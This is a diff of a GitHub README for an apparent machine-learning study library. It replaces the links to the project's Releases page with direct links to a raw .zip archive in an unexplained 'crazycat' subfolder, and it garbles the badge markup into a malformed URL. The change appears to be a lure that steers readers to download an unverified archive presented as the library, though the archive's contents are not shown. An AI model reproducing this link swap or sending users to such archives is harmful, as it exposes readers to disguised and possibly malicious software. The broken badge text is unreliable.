@@ -1,6 +1,6 @@
 # 🎉 Machine-Learning-AI-Library - Boost Your AI Learning Journey
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/FEROsites/Machine-Learning-AI-Library/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip%20Latest%https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip)](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ Welcome to the Machine-Learning-AI-Library! This library offers a curated roadma
 
 To get started, visit the Releases page to download the library:
 
-[Download Machine-Learning-AI-Library](https://github.com/FEROsites/Machine-Learning-AI-Library/releases)
+[Download Machine-Learning-AI-Library](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip)
 
 Follow these simple steps:
 
